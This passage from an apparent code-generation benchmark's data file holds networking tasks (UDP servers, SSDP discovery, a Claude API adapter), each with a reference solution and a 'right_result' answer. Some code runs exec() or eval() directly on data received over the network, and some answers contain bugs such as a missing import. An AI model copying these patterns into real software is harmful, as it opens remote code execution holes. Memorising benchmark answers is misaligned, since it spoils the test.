    "Canonical_solution": "import sys\nimport wx\nfrom twisted.internet import wxreactor\nwxreactor.install()\nfrom twisted.internet.protocol import DatagramProtocol\nfrom twisted.internet import reactor\nfrom twisted.python import log\n\nclass M2UDP(DatagramProtocol):\n    def __init__(self, engine=None, mlab=None):\n        self.engine = engine\n        self.mlab = mlab\n        if self.engine is not None:\n            self.scene = self.engine.current_scene.scene\n\n    def datagramReceived(self, data, host_port):\n        host, port = host_port\n        log.msg(\"Received: %r from %s:%d\" % (data, host, port))\n        c = data.strip()\n        if len(c) > 0:\n            mlab = self.mlab\n            engine = self.engine\n            scene = self.scene\n            camera = scene.camera\n            try:\n                exec(c, locals(), globals())\n            except:\n                log.err()\n            scene.render()\n\nclass MayaviUDPServer:\n    def __init__(self, engine=None, port=9007, logto=sys.stdout):\n        from mayavi import mlab\n        self.engine = engine or mlab.get_engine()\n        self.port = port\n        self.logto = logto\n        self.mlab = mlab\n\n    def serve(self):\n        proto = M2UDP(engine=self.engine, mlab=self.mlab)\n        \n        if self.logto is not None:\n            log.startLogging(self.logto)\n        log.msg('Serving Mayavi2 UDP server on port', self.port)\n        log.msg('Using Engine', self.engine)\n\n        reactor.registerWxApp(wx.GetApp())\n        reactor.listenUDP(self.port, proto)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 73,
    "right_result": "from twisted.internet import reactor, protocol\nfrom mayavi import mlab\nimport sys\n\nclass M2UDP(protocol.DatagramProtocol):\n    def __init__(self, engine=None, mlab=None):\n        self.engine = engine\n        self.mlab = mlab\n        self.scene = None\n        if self.engine:\n            self.scene = self.engine.current_scene\n\n    def datagramReceived(self, data, host_port):\n        try:\n            if self.scene:\n                self.scene.disable_render = False\n            exec_globals = {\n                'engine': self.engine,\n                'mlab': self.mlab,\n                'scene': self.scene\n            }\n            exec(data, exec_globals)\n            if self.scene:\n                self.scene.render()\n        except Exception as e:\n            print >>sys.stderr, \"Error executing command:\", str(e)\n\nclass MayaviUDPServer:\n    def __init__(self, engine=None, port=9007, logto=sys.stdout):\n        self.engine = engine\n        self.port = port\n        self.logto = logto\n        self.mlab = mlab\n        self.proto = M2UDP(engine, self.mlab)\n\n    def serve(self):\n        reactor.listenUDP(self.port, self.proto)\n        reactor.run()"
  },
  {
    "Task_id": 422,
    "Instruction": "Task Description: Implement a UDP server that listens for incoming messages on a specified IP address and port, processes the received data, and terminates when a specific exit command is received.\n\nFunction Description: The function `udp_server` creates a UDP socket, binds it to a local IP address and port, and continuously listens for incoming messages. It processes the received data by decoding it from bytes to a UTF-8 string and checks for an exit command to terminate the loop. The socket is closed once the loop exits.\n\nInput: None\n\nOutput: None",
    "Canonical_solution": "import socket\n\ndef udp_server():\n    UDP_IP = \"127.0.0.1\"\n    UDP_PORT = 6000\n\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind((UDP_IP, UDP_PORT))\n\n    while True:\n        dataudp, addr = sock.recvfrom(1024)  # buffer size is 1024 bytes\n        try:\n            data = str(dataudp.rstrip('\\x00').decode('utf-8'))\n        except:\n            data = str(dataudp.decode('utf-8'))\n        \n        # Process received data here\n        \n        if \"Exit\" in data:\n            break\n\n    sock.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 71,
    "right_result": "import socket\n\ndef udp_server():\n    host = '127.0.0.1'\n    port = 5000\n    exit_command = \"EXIT\"\n\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind((host, port))\n\n    while True:\n        data, addr = sock.recvfrom(1024)\n        message = data.decode('utf-8')\n        if message.strip() == exit_command:\n            break\n\n    sock.close()"
  },
  {
    "Task_id": 425,
    "Instruction": "Task Description: Implement a UDP socket handler class that facilitates UDP communication with advanced features like receiving destination address information and binding to any available interface.\n\nClass Description: The UDPSocketHandler class provides methods for setting up UDP listeners, receiving UDP packets with ancillary data (including destination address), and sending UDP packets with specific source binding. It's designed for scenarios where you need detailed control over UDP communication, such as when implementing network proxies or specialized UDP services.\n\nAttributes:\n[Note: The reference implementation doesn't show any instance attributes, but uses class-level constants]\nIP_BINDANY: [int] - Socket option constant for binding to any available interface\nIP_RECVDSTADDR: [int] - Socket option constant for receiving destination address information\n\nMethods:\nMethod1: recv_udp(listener: socket.socket, bufsize: int) -> tuple - Receives UDP data along with source and destination address information\n  Parameters:\n    - listener: The UDP socket to receive data from\n    - bufsize: Maximum amount of data to receive\n  Returns:\n    - tuple: (srcip, dstip, data) where:\n      srcip: Source address (IP, port)\n      dstip: Destination address (IP, port) or None\n      data: Received data\n\nMethod2: send_udp(sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None - Sends UDP data with specific source binding\n  Parameters:\n    - sock: The original socket (used for family information)\n    - srcip: Source address (IP, port) to bind to\n    - dstip: Destination address (IP, port) to send to\n    - data: Data to send\n  Returns: None\n\nMethod3: setup_udp_listener(udp_listener: object) -> None - Configures a UDP listener socket to receive destination address information\n  Parameters:\n    - udp_listener: An object containing v4 and/or v6 socket instances\n  Returns: None",
    "Canonical_solution": "import socket\nimport subprocess as ssubprocess\nfrom sshuttle.helpers import debug1, debug3, Fatal\n\nIP_BINDANY = 24\nIP_RECVDSTADDR = 7\n\nclass UDPSocketHandler:\n    def __init__(self):\n        pass\n\n    def recv_udp(self, listener, bufsize):\n        debug3('Accept UDP python using recvmsg.')\n        data, ancdata, _, srcip = listener.recvmsg(4096,\n                                                  socket.CMSG_SPACE(4))\n        dstip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_RECVDSTADDR:\n                port = 53\n                ip = socket.inet_ntop(socket.AF_INET, cmsg_data[0:4])\n                dstip = (ip, port)\n                break\n        return (srcip, dstip, data)\n\n    def send_udp(self, sock, srcip, dstip, data):\n        if not srcip:\n            debug1(\n               \"-- ignored UDP to %r: \"\n               \"couldn't determine source IP address\" % (dstip,))\n            return\n\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_IP, IP_BINDANY, 1)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener):\n        if udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(socket.SOL_IP, IP_RECVDSTADDR, 1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "right_result": "import socket\nimport struct\n\nclass UDPSocketHandler:\n    IP_BINDANY = 24\n    IP_RECVDSTADDR = 8\n\n    @staticmethod\n    def recv_udp(listener, bufsize):\n        data, ancdata, flags, srcip = listener.recvmsg(bufsize, socket.CMSG_LEN(16))\n        dstip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == UDPSocketHandler.IP_RECVDSTADDR:\n                dstip = socket.inet_ntop(socket.AF_INET, cmsg_data[:4])\n                port, = struct.unpack('!H', cmsg_data[4:6])\n                dstip = (dstip, port)\n        return srcip, dstip, data\n\n    @staticmethod\n    def send_udp(sock, srcip, dstip, data):\n        send_sock = socket.socket(sock.family, socket.SOCK_DGRAM)\n        try:\n            if sock.family == socket.AF_INET:\n                send_sock.setsockopt(socket.SOL_IP, UDPSocketHandler.IP_BINDANY, 1)\n            elif sock.family == socket.AF_INET6:\n                send_sock.setsockopt(socket.SOL_IPV6, UDPSocketHandler.IP_BINDANY, 1)\n            send_sock.bind(srcip)\n            send_sock.sendto(data, dstip)\n        finally:\n            send_sock.close()\n\n    @staticmethod\n    def setup_udp_listener(udp_listener):\n        if hasattr(udp_listener, 'v4') and udp_listener.v4:\n            udp_listener.v4.setsockopt(socket.SOL_IP, UDPSocketHandler.IP_RECVDSTADDR, 1)\n        if hasattr(udp_listener, 'v6') and udp_listener.v6:\n            udp_listener.v6.setsockopt(socket.SOL_IPV6, UDPSocketHandler.IP_RECVDSTADDR, 1)"
  },
  {
    "Task_id": 426,
    "Instruction": "Task Description: Implement a function to receive a multicast token via UDP communication, handling potential timeouts and interruptions gracefully.\n\nFunction Description: The function continuously listens for incoming UDP packets on a specified port, attempting to extract and decode a token from valid JSON messages. It runs in a loop until either a valid token is received or a cancellation flag is set. The function handles socket timeouts and other exceptions silently, only processing valid messages that match the expected format.\n\nInput: None (uses global variables for control flow)\n\nOutput: None (modifies global variable 'multicast_token' when successful)",
    "Canonical_solution": "import socket\nimport struct\nimport json\nimport threading\n\nglobal multicast_token, cancel_thread\nmulticast_token = None\ncancel_thread = False\n\ndef receive_token():\n    global multicast_token, cancel_thread\n    received_token = False\n    while received_token == False and cancel_thread == False:\n        s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n        s.bind(('0.0.0.0', 6669))\n        s.settimeout(2)\n        try:\n            # despite suggestions of being unused, addr must remain present, or this will fail\n            msg, addr = s.recvfrom(255)\n            (msglen,) = struct.unpack(\">I\", msg[12:16])\n            msg = msg[16: msglen + 8].decode()\n            msg = json.loads(msg)\n            token = msg[\"token\"]\n            received_token = True\n            s.close()\n            multicast_token = token\n        except KeyboardInterrupt:\n            return\n        except:\n            pass",
    "Code_level": "Function-level",
    "FSMID_for_test": 71,
    "right_result": "import socket\nimport json\nimport time\n\nmulticast_token = None\nstop_listening = False\nUDP_PORT = 5005\n\ndef listen_for_multicast_token():\n    global multicast_token, stop_listening\n    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    udp_socket.settimeout(1)\n    try:\n        udp_socket.bind(('', UDP_PORT))\n    except Exception as e:\n        return\n\n    while not stop_listening:\n        try:\n            data, addr = udp_socket.recvfrom(1024)\n            decoded_data = data.decode('utf-8')\n            try:\n                message = json.loads(decoded_data)\n                if 'token' in message:\n                    multicast_token = message['token']\n                    break\n            except json.JSONDecodeError:\n                continue\n        except socket.timeout:\n            continue\n        except Exception:\n            continue\n    udp_socket.close()"
  },
  {
    "Task_id": 427,
    "Instruction": "Task Description: Implement a function that listens for a multicast token over UDP, decodes the received message, and extracts the token value.\n\nFunction Description: The function continuously listens on a specified UDP port for incoming messages containing a token. When a valid message is received, it parses the message, extracts the token, and stores it in a global variable. The function handles socket creation, binding, timeout, and cleanup, and runs in a loop until a token is received or a cancellation flag is set.\n\nInput: None (uses global variables `multicast_token` and `cancel_thread` for state management)\n\nOutput: None (updates the global variable `multicast_token` with the received token if successful)",
    "Canonical_solution": "import socket\nimport struct\nimport json\nimport threading\nimport time\n\nglobal multicast_token, cancel_thread\nmulticast_token = None\ncancel_thread = False\n\ndef receive_token():\n    global multicast_token, cancel_thread\n    received_token = False\n    while received_token == False and cancel_thread == False:\n        s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n        s.bind(('0.0.0.0', 6669))\n        s.settimeout(2)\n        try:\n            # despite suggestions of being unused, addr must remain present, or this will fail\n            msg, addr = s.recvfrom(255)\n            (msglen,) = struct.unpack(\">I\", msg[12:16])\n            msg = msg[16: msglen + 8].decode()\n            msg = json.loads(msg)\n            token = msg[\"token\"]\n            received_token = True\n            s.close()\n            multicast_token = token\n        except KeyboardInterrupt:\n            return\n        except:\n            pass",
    "Code_level": "Function-level",
    "FSMID_for_test": 71,
    "right_result": "import socket\nimport json\n\nmulticast_token = None\ncancel_thread = False\n\ndef listen_for_multicast_token():\n    global multicast_token, cancel_thread\n    multicast_group = '224.1.1.1'\n    server_address = ('', 5000)\n\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.settimeout(1.0)\n    sock.bind(server_address)\n\n    group = socket.inet_aton(multicast_group)\n    mreq = struct.pack('4sL', group, socket.INADDR_ANY)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)\n\n    while not cancel_thread and multicast_token is None:\n        try:\n            data, address = sock.recvfrom(1024)\n            message = json.loads(data.decode())\n            if 'token' in message:\n                multicast_token = message['token']\n        except socket.timeout:\n            continue\n        except Exception as e:\n            continue\n\n    sock.close()"
  },
  {
    "Task_id": 428,
    "Instruction": "Task Description: Implement a Simple Service Discovery Protocol (SSDP) server using UDP multicast communication to handle device discovery and announcement in a network.\n\nClass Description: The SSDPServer class implements an SSDP server that listens for M-SEARCH requests and responds with device information. It supports device registration, unregistration, and sending byebye notifications when shutting down.\n\nAttributes:\n- ip_list: [list] - List of tuples containing local IP addresses and their subnet masks\n- sock_list: [list] - List of socket objects for each IP address\n- sock: [socket.socket] - Main UDP socket for communication\n- running: [bool] - Flag indicating if the server is running\n- ssdp_thread: [threading.Thread] - Thread running the server's main loop\n- sending_byebye: [bool] - Flag controlling whether to send byebye notifications\n- known: [dict] - Dictionary of registered services with their USN as keys\n\nMethods:\n- __init__() -> None - Initializes the SSDP server with default values\n- start() -> None - Starts the SSDP server thread\n- stop(byebye: bool) -> None - Stops the SSDP server thread, with option to send byebye notifications\n- run() -> None - Main server loop that handles incoming requests\n- datagram_received(data: bytes, host_port: tuple) -> None - Processes incoming UDP datagrams\n- discovery_request(headers: dict, host_port: tuple) -> None - Handles M-SEARCH discovery requests\n- get_subnet_ip(ip: str, mask: str) -> list - Calculates subnet IP address\n- shutdown() -> None - Cleans up resources and sends byebye notifications\n- register(usn: str, st: str, location: str, server: str, cache_control: str) -> None - Registers a new service\n- unregister(usn: str) -> None - Unregisters a service\n- do_byebye(usn: str) -> None - Sends byebye notification for a service\n- send_it(response: str, destination: tuple) -> None - Sends a response to the specified destination",
    "Canonical_solution": "import sys\nimport random\nimport socket\nimport logging\nimport threading\nfrom email.utils import formatdate\n\nSSDP_PORT = 1900\nSSDP_ADDR = '239.255.255.250'\nSERVER_ID = 'SSDP Server'\n\nclass SSDPServer:\n    def __init__(self):\n        self.ip_list = []\n        self.sock_list = []\n        self.sock = None\n        self.running = False\n        self.ssdp_thread = None\n        self.sending_byebye = True\n        self.known = {}\n\n    def start(self):\n        if not self.running:\n            self.running = True\n            self.sending_byebye = True\n            self.ssdp_thread = threading.Thread(target=self.run, name=\"SSDP_THREAD\")\n            self.ssdp_thread.start()\n\n    def stop(self, byebye=True):\n        if self.running:\n            self.running = False\n            try:\n                socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b'', (SSDP_ADDR, SSDP_PORT))\n            except Exception:\n                pass\n            self.sending_byebye = byebye\n            if self.ssdp_thread is not None:\n                self.ssdp_thread.join()\n\n    def run(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)\n\n        if sys.platform == 'win32':\n            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        elif sys.platform == 'darwin':\n            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n        elif hasattr(socket, \"SO_REUSEPORT\"):\n            try:\n                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n            except socket.error:\n                try:\n                    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n                except socket.error:\n                    pass\n\n        self.ip_list = [('192.168.137.1', '255.255.255.0')] if sys.platform == 'win32' else []\n        self.sock_list = []\n        for ip, mask in self.ip_list:\n            try:\n                mreq = socket.inet_aton(SSDP_ADDR) + socket.inet_aton(ip)\n                self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)\n                self.sock_list.append(Sock(ip))\n            except Exception:\n                pass\n\n        try:\n            self.sock.bind(('0.0.0.0', SSDP_PORT))\n        except Exception:\n            return\n        self.sock.settimeout(1)\n\n        while self.running:\n            try:\n                data, addr = self.sock.recvfrom(1024)\n                self.datagram_received(data, addr)\n            except socket.timeout:\n                continue\n\n        self.shutdown()\n        for ip, mask in self.ip_list:\n            mreq = socket.inet_aton(SSDP_ADDR) + socket.inet_aton(ip)\n            try:\n                self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_DROP_MEMBERSHIP, mreq)\n            except Exception:\n                continue\n        self.sock.close()\n        self.sock = None\n\n    def datagram_received(self, data, host_port):\n        try:\n            header = data.decode().split('\\r\\n\\r\\n')[0]\n        except ValueError:\n            return\n        if len(header) == 0:\n            return\n\n        lines = header.split('\\r\\n')\n        cmd = lines[0].split(' ')\n        lines = map(lambda x: x.replace(': ', ':', 1), lines[1:])\n        lines = filter(lambda x: len(x) > 0, lines)\n        headers = dict(map(lambda x: (x[0].lower(), x[1]), [x.split(':', 1) for x in lines]))\n\n        if cmd[0] == 'M-SEARCH' and cmd[1] == '*':\n            self.discovery_request(headers, host_port)\n\n    def discovery_request(self, headers, host_port):\n        (host, port) = host_port\n        for i in self.known.values():\n            if i['ST'] == headers['st'] or headers['st'] == 'ssdp:all':\n                response = ['HTTP/1.1 200 OK']\n                usn = None\n                for k, v in i.items():\n                    if k == 'USN':\n                        usn = v\n                    response.append('%s: %s' % (k, v))\n\n                if usn:\n                    response.append('DATE: %s' % formatdate(timeval=None, localtime=False, usegmt=True))\n                    response.extend(('', ''))\n                    destination = (host, port)\n                    for ip, mask in self.ip_list:\n                        if self.get_subnet_ip(ip, mask) == self.get_subnet_ip(host, mask):\n                            self.sock.sendto('\\r\\n'.join(response).format(ip).encode(), destination)\n                            break\n\n    def get_subnet_ip(self, ip, mask):\n        a = [int(n) for n in mask.split('.')]\n        b = [int(n) for n in ip.split('.')]\n        return [a[i] & b[i] for i in range(4)]\n\n    def shutdown(self):\n        for st in self.known:\n            self.do_byebye(st)\n        usn = [st for st in self.known]\n        for st in usn:\n            self.unregister(st)\n\n    def register(self, usn, st, location, server=SERVER_ID, cache_control='max-age=1800'):\n        self.known[usn] = {\n            'USN': usn,\n            'LOCATION': location,\n            'ST': st,\n            'EXT': '',\n            'SERVER': server,\n            'CACHE-CONTROL': cache_control\n        }\n\n    def unregister(self, usn):\n        del self.known[usn]\n\n    def do_byebye(self, usn):\n        if not self.sending_byebye:\n            return\n\n        resp = [\n            'NOTIFY * HTTP/1.1',\n            'HOST: %s:%d' % (SSDP_ADDR, SSDP_PORT),\n            'NTS: ssdp:byebye',\n        ]\n        try:\n            stcpy = dict(self.known[usn].items())\n            stcpy['NT'] = stcpy['ST']\n            del stcpy['ST']\n            resp.extend(map(lambda x: ': '.join(x), stcpy.items()))\n            resp.extend(('', ''))\n            if self.sock:\n                try:\n                    self.send_it('\\r\\n'.join(resp), (SSDP_ADDR, SSDP_PORT))\n                except (AttributeError, socket.error):\n                    pass\n        except KeyError:\n            pass\n\n    def send_it(self, response, destination):\n        for sock in self.sock_list:\n            sock.send_it(response, destination)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "right_result": "import socket\nimport threading\nimport struct\nimport uuid\nimport time\nimport logging\n\nclass SSDPServer:\n    def __init__(self):\n        self.ip_list = []\n        self.sock_list = []\n        self.sock = None\n        self.running = False\n        self.ssdp_thread = None\n        self.sending_byebye = False\n        self.known = {}\n\n    def start(self):\n        if not self.running:\n            self.running = True\n            self.ssdp_thread = threading.Thread(target=self.run)\n            self.ssdp_thread.start()\n\n    def stop(self, byebye=False):\n        if self.running:\n            self.sending_byebye = byebye\n            self.running = False\n            if self.ssdp_thread:\n                self.ssdp_thread.join()\n            self.shutdown()\n\n    def run(self):\n        try:\n            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n            self.sock.settimeout(1)\n            self.sock.bind(('0.0.0.0', 1900))\n            mreq = struct.pack(\"4sl\", socket.inet_aton(\"239.255.255.250\"), socket.INADDR_ANY)\n            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)\n\n            while self.running:\n                try:\n                    data, addr = self.sock.recvfrom(65507)\n                    self.datagram_received(data, addr)\n                except socket.timeout:\n                    continue\n        except Exception as e:\n            logging.error(f\"SSDP server error: {e}\")\n        finally:\n            self.sock.close()\n\n    def datagram_received(self, data, host_port):\n        try:\n            headers = {}\n            lines = data.decode('utf-8').split('\\r\\n')\n            method = lines[0]\n            for line in lines[1:]:\n                if ':' in line:\n                    key, value = line.split(':', 1)\n                    headers[key.strip().upper()] = value.strip()\n\n            if method.startswith('M-SEARCH'):\n                self.discovery_request(headers, host_port)\n        except Exception as e:\n            logging.error(f\"Error processing datagram: {e}\")\n\n    def discovery_request(self, headers, host_port):\n        st = headers.get('ST')\n        mx = int(headers.get('MX', 1))\n        man = headers.get('MAN', '')\n        if man == '\"ssdp:discover\"' and st:\n            response = \"HTTP/1.1 200 OK\\r\\n\"\n            response += \"Location: {}\\r\\n\"\n            response += \"ST: {}\\r\\n\"\n            response += \"USN: {}\\r\\n\"\n            response += \"SERVER: {}\\r\\n\"\n            response += \"CACHE-CONTROL: max-age=1800\\r\\n\\r\\n\"\n\n            for usn, info in self.known.items():\n                if info['st'] == st or st == 'ssdp:all':\n                    send_response = response.format(info['location'], info['st'], usn, info['server'])\n                    time.sleep(mx * 0.1)  # Random delay up to MX*0.1 seconds\n                    self.send_it(send_response, host_port)\n\n    def get_subnet_ip(self, ip, mask):\n        ip_num = struct.unpack('!I', socket.inet_aton(ip))[0]\n        mask_num = struct.unpack('!I', socket.inet_aton(mask))[0]\n        subnet = ip_num & mask_num\n        return socket.inet_ntoa(struct.pack('!I', subnet))\n\n    def shutdown(self):\n        if self.sending_byebye:\n            for usn in list(self.known.keys()):\n                self.do_byebye(usn)\n                time.sleep(0.1)\n        if self.sock:\n            self.sock.close()\n        self.sock_list = []\n\n    def register(self, usn, st, location, server, cache_control=\"max-age=1800\"):\n        self.known[usn] = {\n            'st': st,\n            'location': location,\n            'server': server,\n            'cache_control': cache_control,\n            'last_notify': time.time()\n        }\n\n    def unregister(self, usn):\n        if usn in self.known:\n            del self.known[usn]\n\n    def do_byebye(self, usn):\n        if usn in self.known:\n            byebye = \"NOTIFY * HTTP/1.1\\r\\n\"\n            byebye += \"Host: 239.255.255.250:1900\\r\\n\"\n            byebye += \"NT: {}\\r\\n\".format(self.known[usn]['st'])\n            byebye += \"USN: {}\\r\\n\".format(usn)\n            byebye += \"NTS: ssdp:byebye\\r\\n\\r\\n\"\n            self.send_it(byebye, (\"239.255.255.250\", 1900))\n\n    def send_it(self, response, destination):\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            sock.sendto(response.encode('utf-8'), destination)\n            sock.close()\n        except Exception as e:\n            logging.error(f\"Error sending response: {e}\")"
  },
  {
    "Task_id": 43,
    "Instruction": "Task Description: Create a Python class that acts as an adapter between OpenAI's API format and Claude's API format, handling HTTP requests asynchronously using httpx and asyncio.\n\nClass Description: The ClaudeAdapter class facilitates communication with Claude's API by converting OpenAI-style requests to Claude's format and vice versa. It handles both synchronous and streaming responses, manages API keys, and processes HTTP requests with proper error handling.\n\nAttributes:\n- claude_api_key: str - The API key for Claude's service, either from environment variables or request headers\n- claude_base_url: str - The base URL for Claude's API endpoints (default: \"https://api.anthropic.com\")\n\nMethods:\n- __init__(claude_base_url: str = \"https://api.anthropic.com\") -> None - Initializes the adapter with optional base URL configuration\n- get_api_key(headers: dict) -> str - Extracts the API key from request headers or falls back to environment variable\n- chat(request: Request) -> AsyncGenerator - Main method that handles incoming requests, converts parameters, makes API calls, and yields responses in OpenAI format\n- openai_to_claude_params(openai_params: dict) -> dict - Converts OpenAI-style parameters to Claude's format (implementation not shown)\n- claude_to_chatgpt_response(claude_response: dict) -> dict - Converts Claude's response format to OpenAI's format (implementation not shown)\n- claude_to_chatgpt_response_stream(claude_response: dict) -> dict - Converts streaming response format (implementation not shown)",
    "Canonical_solution": "import httpx\nimport time\nimport json\nimport os\nfrom fastapi import Request\n\nclass ClaudeAdapter:\n    def __init__(self, claude_base_url=\"https://api.anthropic.com\"):\n        self.claude_api_key = os.getenv(\"CLAUDE_API_KEY\", None)\n        self.claude_base_url = claude_base_url\n\n    def get_api_key(self, headers):\n        auth_header = headers.get(\"authorization\", None)\n        if auth_header:\n            return auth_header.split(\" \")[1]\n        else:\n            return self.claude_api_key\n\n    async def chat(self, request: Request):\n        openai_params = await request.json()\n        headers = request.headers\n        claude_params = self.openai_to_claude_params(openai_params)\n        api_key = self.get_api_key(headers)\n\n        async with httpx.AsyncClient(timeout=120.0) as client:\n            if not claude_params.get(\"stream\", False):\n                response = await client.post(\n                    f\"{self.claude_base_url}/v1/complete\",\n                    headers={\n                        \"x-api-key\": api_key,\n                        \"accept\": \"application/json\",\n                        \"content-type\": \"application/json\",\n                        \"anthropic-version\": \"2023-06-01\",\n                    },\n                    json=claude_params,\n                )\n                if response.is_error:\n                    raise Exception(f\"Error: {response.status_code}\")\n                claude_response = response.json()\n                openai_response = self.claude_to_chatgpt_response(claude_response)\n                yield openai_response\n            else:\n                async with client.stream(\n                    \"POST\",\n                    f\"{self.claude_base_url}/v1/complete\",\n                    headers={\n                        \"x-api-key\": api_key,\n                        \"accept\": \"application/json\",\n                        \"content-type\": \"application/json\",\n                        \"anthropic-version\": \"2023-06-01\",\n                    },\n                    json=claude_params,\n                ) as response:\n                    if response.is_error:\n                        raise Exception(f\"Error: {response.status_code}\")\n                    async for line in response.aiter_lines():\n                        if line:\n                            stripped_line = line.lstrip(\"data:\")\n                            if stripped_line:\n                                try:\n                                    decoded_line = json.loads(stripped_line)\n                                    stop_reason = decoded_line.get(\"stop_reason\")\n                                    if stop_reason:\n                                        yield self.claude_to_chatgpt_response_stream(\n                                            {\n                                                \"completion\": \"\",\n                                                \"stop_reason\": stop_reason,\n                                            }\n                                        )\n                                        yield \"[DONE]\"\n                                    else:\n                                        completion = decoded_line.get(\"completion\")\n                                        if completion:\n                                            openai_response = (\n                                                self.claude_to_chatgpt_response_stream(\n                                                    decoded_line\n                                                )\n                                            )\n                                            yield openai_response\n                                except json.JSONDecodeError as e:\n                                    logger.debug(\n                                        f\"Error decoding JSON: {e}\"\n                                    )",
    "Code_level": "Class-level",
    "FSMID_for_test": 59,
    "right_result": "import os\nimport asyncio\nfrom typing import AsyncGenerator, Dict, Any\nimport httpx\nfrom fastapi import Request, HTTPException\n\nclass ClaudeAdapter:\n    def __init__(self, claude_base_url: str = \"https://api.anthropic.com\"):\n        self.claude_base_url = claude_base_url\n        self.claude_api_key = os.getenv(\"CLAUDE_API_KEY\", \"\")\n\n    def get_api_key(self, headers: dict) -> str:\n        auth_header = headers.get(\"authorization\", \"\")\n        if auth_header.startswith(\"Bearer \"):\n            return auth_header.split(\" \")[1]\n        return self.claude_api_key\n\n    async def chat(self, request: Request) -> AsyncGenerator:\n        openai_params = await request.json()\n        claude_params = self.openai_to_claude_params(openai_params)\n        \n        api_key = self.get_api_key(request.headers)\n        headers = {\n            \"x-api-key\": api_key,\n            \"Content-Type\": \"application/json\",\n            \"anthropic-version\": \"2023-06-01\"\n        }\n\n        url = f\"{self.claude_base_url}/v1/complete\"\n        \n        is_streaming = claude_params.get(\"stream\", False)\n\n        async with httpx.AsyncClient() as client:\n            if is_streaming:\n                async with client.stream(\"POST\", url, json=claude_params, headers=headers) as response:\n                    if response.status_code != 200:\n                        raise HTTPException(status_code=response.status_code, detail=await response.text())\n                    \n                    async for chunk in response.aiter_text():\n                        if chunk.strip():\n                            try:\n                                claude_data = eval(chunk.strip())  # Simplified parsing for example\n                                yield self.claude_to_chatgpt_response_stream(claude_data)\n                            except Exception as e:\n                                continue\n            else:\n                response = await client.post(url, json=claude_params, headers=headers)\n                if response.status_code != 200:\n                    raise HTTPException(status_code=response.status_code, detail=response.text())\n                \n                claude_response = response.json()\n                yield self.claude_to_chatgpt_response(claude_response)\n\n    def openai_to_claude_params(self, openai_params: dict) -> dict:\n        # Implementation to convert OpenAI params to Claude format\n        pass\n\n    def claude_to_chatgpt_response(self, claude_response: dict) -> dict:\n        # Implementation to convert Claude response to OpenAI format\n        pass\n\n    def claude_to_chatgpt_response_stream(self, claude_response: dict) -> dict:\n        # Implementation to convert streaming responses\n        pass"
  },
  {
    "Task_id": 431,
    "Instruction": "Task Description: Implement a class for discovering devices on a network using SSDP (Simple Service Discovery Protocol) over UDP multicast. The class should be able to send discovery requests and handle responses from devices.\n\nClass Description: The SSDPDiscover class is responsible for discovering UPnP/DLNA devices on a local network using SSDP. It sends M-SEARCH requests to a multicast address and listens for responses. The class supports both single-socket and multi-socket modes for sending discovery requests.\n\nAttributes:\n- SSDP_ADDRESS: [str] - The multicast address for SSDP (239.255.255.250)\n- SSDP_PORT: [int] - The port number for SSDP (1900)\n- SSDP_MX: [int] - The maximum wait time for responses (in seconds)\n- SSDP_TTL: [int] - The time-to-live for multicast packets\n- SSDP_AMOUNT: [int] - The number of discovery requests to send\n- MSEARCH_PORT: [int] - The local port to bind to for sending discovery requests (0 for random)\n- MSEARCH_MSG: [str] - The M-SEARCH request message template\n- BUFFER_SIZE: [int] - The size of the buffer for receiving responses\n- USE_SINGLE_SOCKET: [bool] - Whether to use a single socket for all requests or one per interface\n- cb_on_device_response: [callable] - Callback function to handle device responses\n- host: [str] - The host address to bind to (None for all interfaces)\n- addresses: [list] - List of local IPv4 addresses\n\nMethods:\n- __init__(cb_on_device_response, host=None) -> [None] - Initializes the SSDPDiscover instance with a callback for device responses and an optional host address.\n- refresh_addresses() -> [None] - Refreshes the list of local IPv4 addresses.\n- search(ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None) -> [None] - Initiates the device discovery process with optional parameters for TTL, MX, and request amount.\n- _search(host, ssdp_ttl, ssdp_mx, ssdp_amount) -> [None] - Internal method to perform the discovery process for a specific host.\n- _send_discover(sock, ssdp_mx) -> [None] - Internal method 